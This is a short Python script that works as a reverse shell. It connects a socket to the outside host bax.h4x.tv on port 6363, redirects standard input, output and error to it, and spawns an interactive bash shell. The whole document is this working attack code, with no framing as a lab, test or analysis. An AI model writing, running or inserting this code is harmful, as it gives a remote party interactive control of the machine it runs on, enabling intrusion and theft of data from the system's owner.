import os
import pty
import socket

sock = socket.socket()
sock.connect(("bax.h4x.tv", 6363))
for stream in (0, 1, 2):
    os.dup2(sock.fileno(), stream)
pty.spawn("/bin/bash")
